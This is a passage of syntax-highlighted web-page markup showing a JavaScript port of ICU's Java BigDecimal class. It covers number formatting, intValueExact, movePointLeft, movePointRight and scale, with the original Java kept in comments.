class="line">     <span class="keyword">break</span> setafter; <span class="comment">// number did not have carry</span></span><br><span class="line">    <span class="comment">// mantissa got extended .. so go around and check again</span></span><br><span class="line">    &#125;</span><br><span class="line">   &#125;<span class="comment">/*setafter*/</span></span><br><span class="line"></span><br><span class="line">  a=num.layout(); <span class="comment">// lay out, with exponent if required, etc.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Here we have laid-out number in 'a' */</span></span><br><span class="line">  <span class="comment">// now apply 'before' and 'explaces' as needed</span></span><br><span class="line">  <span class="keyword">if</span> (before&gt;<span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="comment">// look for '.' or 'E'</span></span><br><span class="line">    &#123;<span class="keyword">var</span> $<span class="number">11</span>=a.length;p=<span class="number">0</span>;p:<span class="keyword">for</span>(;$<span class="number">11</span>&gt;<span class="number">0</span>;$<span class="number">11</span>--,p++)&#123;</span><br><span class="line">     <span class="keyword">if</span> (a[p]==<span class="string">'.'</span>)</span><br><span class="line">      <span class="keyword">break</span> p;</span><br><span class="line">     <span class="keyword">if</span> (a[p]==<span class="string">'E'</span>)</span><br><span class="line">      <span class="keyword">break</span> p;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;<span class="comment">/*p*/</span></span><br><span class="line">    <span class="comment">// p is now offset of '.', 'E', or character after end of array</span></span><br><span class="line">    <span class="comment">// that is, the current length of before part</span></span><br><span class="line">    <span class="keyword">if</span> (p&gt;before)</span><br><span class="line">     <span class="keyword">this</span>.badarg(<span class="string">"format"</span>,<span class="number">1</span>,before); <span class="comment">// won't fit</span></span><br><span class="line">    <span class="keyword">if</span> (p&lt;before)</span><br><span class="line">     &#123; <span class="comment">// need leading blanks</span></span><br><span class="line">      newa=<span class="keyword">new</span> <span class="built_in">Array</span>((a.length+before)-p);</span><br><span class="line">      &#123;<span class="keyword">var</span> $<span class="number">12</span>=before-p;i=<span class="number">0</span>;i:<span class="keyword">for</span>(;$<span class="number">12</span>&gt;<span class="number">0</span>;$<span class="number">12</span>--,i++)&#123;</span><br><span class="line">       newa[i]=<span class="string">' '</span>;</span><br><span class="line">       &#125;</span><br><span class="line">      &#125;<span class="comment">/*i*/</span></span><br><span class="line">      <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)a,0,(java.lang.Object)newa,i,a.length);</span></span><br><span class="line">      <span class="keyword">this</span>.arraycopy(a,<span class="number">0</span>,newa,i,a.length);</span><br><span class="line">      a=newa;</span><br><span class="line">     &#125;</span><br><span class="line">   <span class="comment">// [if p=before then it's just the right length]</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (explaces&gt;<span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="comment">// look for 'E' [cannot be at offset 0]</span></span><br><span class="line">    &#123;<span class="keyword">var</span> $<span class="number">13</span>=a.length<span class="number">-1</span>;p=a.length<span class="number">-1</span>;p:<span class="keyword">for</span>(;$<span class="number">13</span>&gt;<span class="number">0</span>;$<span class="number">13</span>--,p--)&#123;</span><br><span class="line">     <span class="keyword">if</span> (a[p]==<span class="string">'E'</span>)</span><br><span class="line">      <span class="keyword">break</span> p;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;<span class="comment">/*p*/</span></span><br><span class="line">    <span class="comment">// p is now offset of 'E', or 0</span></span><br><span class="line">    <span class="keyword">if</span> (p==<span class="number">0</span>)</span><br><span class="line">     &#123; <span class="comment">// no E part; add trailing blanks</span></span><br><span class="line">      newa=<span class="keyword">new</span> <span class="built_in">Array</span>((a.length+explaces)+<span class="number">2</span>);</span><br><span class="line">      <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)a,0,(java.lang.Object)newa,0,a.length);</span></span><br><span class="line">      <span class="keyword">this</span>.arraycopy(a,<span class="number">0</span>,newa,<span class="number">0</span>,a.length);</span><br><span class="line">      &#123;<span class="keyword">var</span> $<span class="number">14</span>=explaces+<span class="number">2</span>;i=a.length;i:<span class="keyword">for</span>(;$<span class="number">14</span>&gt;<span class="number">0</span>;$<span class="number">14</span>--,i++)&#123;</span><br><span class="line">       newa[i]=<span class="string">' '</span>;</span><br><span class="line">       &#125;</span><br><span class="line">      &#125;<span class="comment">/*i*/</span></span><br><span class="line">      a=newa;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     &#123;<span class="comment">/* found E */</span> <span class="comment">// may need to insert zeros</span></span><br><span class="line">      places=(a.length-p)<span class="number">-2</span>; <span class="comment">// number so far</span></span><br><span class="line">      <span class="keyword">if</span> (places&gt;explaces)</span><br><span class="line">       <span class="keyword">this</span>.badarg(<span class="string">"format"</span>,<span class="number">3</span>,explaces);</span><br><span class="line">      <span class="keyword">if</span> (places&lt;explaces)</span><br><span class="line">       &#123; <span class="comment">// need to insert zeros</span></span><br><span class="line">        newa=<span class="keyword">new</span> <span class="built_in">Array</span>((a.length+explaces)-places);</span><br><span class="line">        <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)a,0,(java.lang.Object)newa,0,p+2); // through E and sign</span></span><br><span class="line">        <span class="keyword">this</span>.arraycopy(a,<span class="number">0</span>,newa,<span class="number">0</span>,p+<span class="number">2</span>);</span><br><span class="line">        &#123;<span class="keyword">var</span> $<span class="number">15</span>=explaces-places;i=p+<span class="number">2</span>;i:<span class="keyword">for</span>(;$<span class="number">15</span>&gt;<span class="number">0</span>;$<span class="number">15</span>--,i++)&#123;</span><br><span class="line">         newa[i]=<span class="string">'0'</span>;</span><br><span class="line">         &#125;</span><br><span class="line">        &#125;<span class="comment">/*i*/</span></span><br><span class="line">        <span class="comment">//--java.lang.System.arraycopy((java.lang.Object)a,p+2,(java.lang.Object)newa,i,places); // remainder of exponent</span></span><br><span class="line">        <span class="keyword">this</span>.arraycopy(a,p+<span class="number">2</span>,newa,i,places);</span><br><span class="line">        a=newa;</span><br><span class="line">       &#125;</span><br><span class="line">     <span class="comment">// [if places=explaces then it's just the right length]</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">return</span> a.join(<span class="string">""</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns the hashcode for this &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * This hashcode is suitable for use by the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;java.util.Hashtable&lt;/code&gt; class.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Note that two &lt;code&gt;BigDecimal&lt;/code&gt; objects are only guaranteed</span></span><br><span class="line"><span class="comment">  * to produce the same hashcode if they are exactly equal (that is,</span></span><br><span class="line"><span class="comment">  * the &lt;code&gt;String&lt;/code&gt; representations of the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; numbers are identical -- they have the same</span></span><br><span class="line"><span class="comment">  * characters in the same sequence).</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return An &lt;code&gt;int&lt;/code&gt; that is the hashcode for &lt;code&gt;this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public int hashCode()&#123;</span></span><br><span class="line"> <span class="comment">//-- // Maybe calculate ourselves, later.  If so, note that there can be</span></span><br><span class="line"> <span class="comment">//-- // more than one internal representation for a given toString() result.</span></span><br><span class="line"> <span class="comment">//-- return this.toString().hashCode();</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to an &lt;code&gt;int&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * If the &lt;code&gt;BigDecimal&lt;/code&gt; has a non-zero decimal part it is</span></span><br><span class="line"><span class="comment">  * discarded. If the &lt;code&gt;BigDecimal&lt;/code&gt; is out of the possible</span></span><br><span class="line"><span class="comment">  * range for an &lt;code&gt;int&lt;/code&gt; (32-bit signed integer) result then</span></span><br><span class="line"><span class="comment">  * only the low-order 32 bits are used. (That is, the number may be</span></span><br><span class="line"><span class="comment">  * &lt;i&gt;decapitated&lt;/i&gt;.)  To avoid unexpected errors when these</span></span><br><span class="line"><span class="comment">  * conditions occur, use the &#123;@link #intValueExact&#125; method.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return An &lt;code&gt;int&lt;/code&gt; converted from &lt;code&gt;this&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  *         truncated and decapitated if necessary.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public int intValue()&#123;</span></span><br><span class="line"> <span class="comment">//-- return toBigInteger().intValue();</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to an &lt;code&gt;int&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * If the &lt;code&gt;BigDecimal&lt;/code&gt; has a non-zero decimal part or is</span></span><br><span class="line"><span class="comment">  * out of the possible range for an &lt;code&gt;int&lt;/code&gt; (32-bit signed</span></span><br><span class="line"><span class="comment">  * integer) result then an &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return An &lt;code&gt;int&lt;/code&gt; equal in value to &lt;code&gt;this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;this&lt;/code&gt; has a non-zero</span></span><br><span class="line"><span class="comment">  *                 decimal part, or will not fit in an</span></span><br><span class="line"><span class="comment">  *                 &lt;code&gt;int&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public int intValueExact()&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">intValueExact</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//--int lodigit;</span></span><br><span class="line">  <span class="keyword">var</span> lodigit;</span><br><span class="line">  <span class="comment">//--int useexp=0;</span></span><br><span class="line">  <span class="keyword">var</span> useexp=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int result;</span></span><br><span class="line">  <span class="keyword">var</span> result;</span><br><span class="line">  <span class="comment">//--int i=0;</span></span><br><span class="line">  <span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int topdig=0;</span></span><br><span class="line">  <span class="keyword">var</span> topdig=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">// This does not use longValueExact() as the latter can be much</span></span><br><span class="line">  <span class="comment">// slower.</span></span><br><span class="line">  <span class="comment">// intcheck (from pow) relies on this to check decimal part</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.ind==<span class="keyword">this</span>.iszero)</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// easy, and quite common</span></span><br><span class="line">  <span class="comment">/* test and drop any trailing decimal part */</span></span><br><span class="line">  lodigit=<span class="keyword">this</span>.mant.length<span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.exp&lt;<span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    lodigit=lodigit+<span class="keyword">this</span>.exp; <span class="comment">// reduces by -(-exp)</span></span><br><span class="line">    <span class="comment">/* all decimal places must be 0 */</span></span><br><span class="line">    <span class="keyword">if</span> ((!(<span class="keyword">this</span>.allzero(<span class="keyword">this</span>.mant,lodigit+<span class="number">1</span>))))</span><br><span class="line">     <span class="keyword">throw</span> <span class="string">"intValueExact(): Decimal part non-zero: "</span> + <span class="keyword">this</span>.toString();</span><br><span class="line">    <span class="keyword">if</span> (lodigit&lt;<span class="number">0</span>)</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// -1&lt;this&lt;1</span></span><br><span class="line">    useexp=<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;<span class="comment">/* &gt;=0 */</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">this</span>.exp+lodigit)&gt;<span class="number">9</span>)  <span class="comment">// early exit</span></span><br><span class="line">     <span class="keyword">throw</span> <span class="string">"intValueExact(): Conversion overflow: "</span>+<span class="keyword">this</span>.toString();</span><br><span class="line">    useexp=<span class="keyword">this</span>.exp;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="comment">/* convert the mantissa to binary, inline for speed */</span></span><br><span class="line">  result=<span class="number">0</span>;</span><br><span class="line">  &#123;<span class="keyword">var</span> $<span class="number">16</span>=lodigit+useexp;i=<span class="number">0</span>;i:<span class="keyword">for</span>(;i&lt;=$<span class="number">16</span>;i++)&#123;</span><br><span class="line">   result=result*<span class="number">10</span>;</span><br><span class="line">   <span class="keyword">if</span> (i&lt;=lodigit)</span><br><span class="line">    result=result+<span class="keyword">this</span>.mant[i];</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;<span class="comment">/*i*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Now, if the risky length, check for overflow */</span></span><br><span class="line">  <span class="keyword">if</span> ((lodigit+useexp)==<span class="number">9</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="comment">// note we cannot just test for -ve result, as overflow can move a</span></span><br><span class="line">    <span class="comment">// zero into the top bit [consider 5555555555]</span></span><br><span class="line">    topdig=div(result,<span class="number">1000000000</span>); <span class="comment">// get top digit, preserving sign</span></span><br><span class="line">    <span class="keyword">if</span> (topdig!=<span class="keyword">this</span>.mant[<span class="number">0</span>])</span><br><span class="line">     &#123; <span class="comment">// digit must match and be positive</span></span><br><span class="line">      <span class="comment">// except in the special case ...</span></span><br><span class="line">      <span class="keyword">if</span> (result==<span class="number">-2147483648</span>)  <span class="comment">// looks like the special</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">this</span>.ind==<span class="keyword">this</span>.isneg)  <span class="comment">// really was negative</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.mant[<span class="number">0</span>]==<span class="number">2</span>)</span><br><span class="line">         <span class="keyword">return</span> result; <span class="comment">// really had top digit 2</span></span><br><span class="line">      <span class="keyword">throw</span> <span class="string">"intValueExact(): Conversion overflow: "</span>+<span class="keyword">this</span>.toString();</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Looks good */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.ind==<span class="keyword">this</span>.ispos)</span><br><span class="line">   <span class="keyword">return</span> result;</span><br><span class="line">  <span class="keyword">return</span> -result;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a &lt;code&gt;long&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * If the &lt;code&gt;BigDecimal&lt;/code&gt; has a non-zero decimal part it is</span></span><br><span class="line"><span class="comment">  * discarded. If the &lt;code&gt;BigDecimal&lt;/code&gt; is out of the possible</span></span><br><span class="line"><span class="comment">  * range for a &lt;code&gt;long&lt;/code&gt; (64-bit signed integer) result then</span></span><br><span class="line"><span class="comment">  * only the low-order 64 bits are used. (That is, the number may be</span></span><br><span class="line"><span class="comment">  * &lt;i&gt;decapitated&lt;/i&gt;.)  To avoid unexpected errors when these</span></span><br><span class="line"><span class="comment">  * conditions occur, use the &#123;@link #longValueExact&#125; method.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return A &lt;code&gt;long&lt;/code&gt; converted from &lt;code&gt;this&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  *         truncated and decapitated if necessary.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public long longValue()&#123;</span></span><br><span class="line"> <span class="comment">//-- return toBigInteger().longValue();</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a &lt;code&gt;long&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * If the &lt;code&gt;BigDecimal&lt;/code&gt; has a non-zero decimal part or is</span></span><br><span class="line"><span class="comment">  * out of the possible range for a &lt;code&gt;long&lt;/code&gt; (64-bit signed</span></span><br><span class="line"><span class="comment">  * integer) result then an &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return A &lt;code&gt;long&lt;/code&gt; equal in value to &lt;code&gt;this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if &lt;code&gt;this&lt;/code&gt; has a non-zero</span></span><br><span class="line"><span class="comment">  *                 decimal part, or will not fit in a</span></span><br><span class="line"><span class="comment">  *                 &lt;code&gt;long&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public long longValueExact()&#123;</span></span><br><span class="line"> <span class="comment">//-- int lodigit;</span></span><br><span class="line"> <span class="comment">//-- int cstart=0;</span></span><br><span class="line"> <span class="comment">//-- int useexp=0;</span></span><br><span class="line"> <span class="comment">//-- long result;</span></span><br><span class="line"> <span class="comment">//-- int i=0;</span></span><br><span class="line"> <span class="comment">//-- long topdig=0;</span></span><br><span class="line"> <span class="comment">//-- // Identical to intValueExact except for result=long, and exp&gt;=20 test</span></span><br><span class="line"> <span class="comment">//-- if (ind==0)</span></span><br><span class="line"> <span class="comment">//--  return 0; // easy, and quite common</span></span><br><span class="line"> <span class="comment">//-- lodigit=mant.length-1; // last included digit</span></span><br><span class="line"> <span class="comment">//-- if (exp&lt;0)</span></span><br><span class="line"> <span class="comment">//--  &#123;</span></span><br><span class="line"> <span class="comment">//--   lodigit=lodigit+exp; // -(-exp)</span></span><br><span class="line"> <span class="comment">//--   /* all decimal places must be 0 */</span></span><br><span class="line"> <span class="comment">//--   if (lodigit&lt;0)</span></span><br><span class="line"> <span class="comment">//--    cstart=0;</span></span><br><span class="line"> <span class="comment">//--   else</span></span><br><span class="line"> <span class="comment">//--    cstart=lodigit+1;</span></span><br><span class="line"> <span class="comment">//--   if ((!(allzero(mant,cstart))))</span></span><br><span class="line"> <span class="comment">//--    throw new java.lang.ArithmeticException("Decimal part non-zero:"+" "+this.toString());</span></span><br><span class="line"> <span class="comment">//--   if (lodigit&lt;0)</span></span><br><span class="line"> <span class="comment">//--    return 0; // -1&lt;this&lt;1</span></span><br><span class="line"> <span class="comment">//--   useexp=0;</span></span><br><span class="line"> <span class="comment">//--  &#125;</span></span><br><span class="line"> <span class="comment">//-- else</span></span><br><span class="line"> <span class="comment">//--  &#123;/* &gt;=0 */</span></span><br><span class="line"> <span class="comment">//--   if ((exp+mant.length)&gt;18)  // early exit</span></span><br><span class="line"> <span class="comment">//--    throw new java.lang.ArithmeticException("Conversion overflow:"+" "+this.toString());</span></span><br><span class="line"> <span class="comment">//--   useexp=exp;</span></span><br><span class="line"> <span class="comment">//--  &#125;</span></span><br><span class="line"> <span class="comment">//--</span></span><br><span class="line"> <span class="comment">//-- /* convert the mantissa to binary, inline for speed */</span></span><br><span class="line"> <span class="comment">//-- // note that we could safely use the 'test for wrap to negative'</span></span><br><span class="line"> <span class="comment">//-- // algorithm here, but instead we parallel the intValueExact</span></span><br><span class="line"> <span class="comment">//-- // algorithm for ease of checking and maintenance.</span></span><br><span class="line"> <span class="comment">//-- result=(long)0;</span></span><br><span class="line"> <span class="comment">//-- &#123;int $17=lodigit+useexp;i=0;i:for(;i&lt;=$17;i++)&#123;</span></span><br><span class="line"> <span class="comment">//--  result=result*10;</span></span><br><span class="line"> <span class="comment">//--  if (i&lt;=lodigit)</span></span><br><span class="line"> <span class="comment">//--   result=result+mant[i];</span></span><br><span class="line"> <span class="comment">//--  &#125;</span></span><br><span class="line"> <span class="comment">//-- &#125;/*i*/</span></span><br><span class="line"> <span class="comment">//--</span></span><br><span class="line"> <span class="comment">//-- /* Now, if the risky length, check for overflow */</span></span><br><span class="line"> <span class="comment">//-- if ((lodigit+useexp)==18)</span></span><br><span class="line"> <span class="comment">//--  &#123;</span></span><br><span class="line"> <span class="comment">//--   topdig=result/1000000000000000000L; // get top digit, preserving sign</span></span><br><span class="line"> <span class="comment">//--   if (topdig!=mant[0])</span></span><br><span class="line"> <span class="comment">//--    &#123; // digit must match and be positive</span></span><br><span class="line"> <span class="comment">//--     // except in the special case ...</span></span><br><span class="line"> <span class="comment">//--     if (result==java.lang.Long.MIN_VALUE)  // looks like the special</span></span><br><span class="line"> <span class="comment">//--      if (ind==isneg)  // really was negative</span></span><br><span class="line"> <span class="comment">//--       if (mant[0]==9)</span></span><br><span class="line"> <span class="comment">//--        return result; // really had top digit 9</span></span><br><span class="line"> <span class="comment">//--     throw new java.lang.ArithmeticException("Conversion overflow:"+" "+this.toString());</span></span><br><span class="line"> <span class="comment">//--    &#125;</span></span><br><span class="line"> <span class="comment">//--  &#125;</span></span><br><span class="line"> <span class="comment">//--</span></span><br><span class="line"> <span class="comment">//-- /* Looks good */</span></span><br><span class="line"> <span class="comment">//-- if (ind==ispos)</span></span><br><span class="line"> <span class="comment">//--  return result;</span></span><br><span class="line"> <span class="comment">//-- return (long)-result;</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose decimal point has</span></span><br><span class="line"><span class="comment">  * been moved to the left by a specified number of positions.</span></span><br><span class="line"><span class="comment">  * The parameter, &lt;code&gt;n&lt;/code&gt;, specifies the number of positions to</span></span><br><span class="line"><span class="comment">  * move the decimal point.</span></span><br><span class="line"><span class="comment">  * That is, if &lt;code&gt;n&lt;/code&gt; is 0 or positive, the number returned is</span></span><br><span class="line"><span class="comment">  * given by:</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;&lt;code&gt;</span></span><br><span class="line"><span class="comment">  * this.multiply(TEN.pow(new BigDecimal(-n)))</span></span><br><span class="line"><span class="comment">  * &lt;/code&gt;</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;n&lt;/code&gt; may be negative, in which case the method returns</span></span><br><span class="line"><span class="comment">  * the same result as &lt;code&gt;movePointRight(-n)&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  n The &lt;code&gt;int&lt;/code&gt; specifying the number of places to</span></span><br><span class="line"><span class="comment">  *           move the decimal point leftwards.</span></span><br><span class="line"><span class="comment">  * @return   A &lt;code&gt;BigDecimal&lt;/code&gt; derived from</span></span><br><span class="line"><span class="comment">  *           &lt;code&gt;this&lt;/code&gt;, with the decimal point moved</span></span><br><span class="line"><span class="comment">  *           &lt;code&gt;n&lt;/code&gt; places to the left.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal movePointLeft(int n)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">movePointLeft</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal res;</span></span><br><span class="line">  <span class="keyword">var</span> res;</span><br><span class="line">  <span class="comment">// very little point in optimizing for shift of 0</span></span><br><span class="line">  res=<span class="keyword">this</span>.clone(<span class="keyword">this</span>);</span><br><span class="line">  res.exp=res.exp-n;</span><br><span class="line">  <span class="keyword">return</span> res.finish(<span class="keyword">this</span>.plainMC,<span class="literal">false</span>); <span class="comment">// finish sets form and checks exponent</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose decimal point has</span></span><br><span class="line"><span class="comment">  * been moved to the right by a specified number of positions.</span></span><br><span class="line"><span class="comment">  * The parameter, &lt;code&gt;n&lt;/code&gt;, specifies the number of positions to</span></span><br><span class="line"><span class="comment">  * move the decimal point.</span></span><br><span class="line"><span class="comment">  * That is, if &lt;code&gt;n&lt;/code&gt; is 0 or positive, the number returned is</span></span><br><span class="line"><span class="comment">  * given by:</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;&lt;code&gt;</span></span><br><span class="line"><span class="comment">  * this.multiply(TEN.pow(new BigDecimal(n)))</span></span><br><span class="line"><span class="comment">  * &lt;/code&gt;</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;n&lt;/code&gt; may be negative, in which case the method returns</span></span><br><span class="line"><span class="comment">  * the same result as &lt;code&gt;movePointLeft(-n)&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  n The &lt;code&gt;int&lt;/code&gt; specifying the number of places to</span></span><br><span class="line"><span class="comment">  *           move the decimal point rightwards.</span></span><br><span class="line"><span class="comment">  * @return   A &lt;code&gt;BigDecimal&lt;/code&gt; derived from</span></span><br><span class="line"><span class="comment">  *           &lt;code&gt;this&lt;/code&gt;, with the decimal point moved</span></span><br><span class="line"><span class="comment">  *           &lt;code&gt;n&lt;/code&gt; places to the right.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal movePointRight(int n)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">movePointRight</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal res;</span></span><br><span class="line">  <span class="keyword">var</span> res;</span><br><span class="line">  res=<span class="keyword">this</span>.clone(<span class="keyword">this</span>);</span><br><span class="line">  res.exp=res.exp+n;</span><br><span class="line">  <span class="keyword">return</span> res.finish(<span class="keyword">this</span>.plainMC,<span class="literal">false</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns the scale of this &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * Returns a non-negative &lt;code&gt;int&lt;/code&gt; which is the scale of the</span></span><br><span class="line"><span class="comment">  * number. The scale is the number of digits in the decimal part of</span></span><br><span class="line"><span class="comment">  * the number if the number were formatted without exponential</span></span><br><span class="line"><span class="comment">  * notation.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return An &lt;code&gt;int&lt;/code&gt; whose value is the scale of this</span></span><br><span class="line"><span class="comment">  *         &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public int scale()&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">scale</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.exp&gt;=<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// scale can never be negative</span></span><br><span class="line">  <span class="keyword">return</span> -<span class="keyword">this</span>.exp;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; with a given scale.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If the given scale (which must be zero or positive) is the same as</span></span><br><span class="line"><span class="comment">  * or greater than the length of the decimal part (the scale) of this</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; then trailing zeros will be added to the</span></span><br><span class="line"><span class="comment">  * decimal part as necessary.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If the given scale is less than the length of the decimal part (the</span></span><br><span class="line"><span class="comment">  * scale) of this &lt;code&gt;BigDecimal&lt;/code&gt; then trailing digits</span></span><br><span class="line"><span class="comment">  * will be removed, and in this case an</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown if any discarded digits</span></span><br><span class="line"><span class="comment">  * are non-zero.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #setScale(int, int)&#125;, where the first parameter</span></span><br><span class="line"><span class="comment">  * is the scale, and the second is</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;MathContext.ROUND_UNNECESSARY&lt;/code&gt;.</span></span><br><span 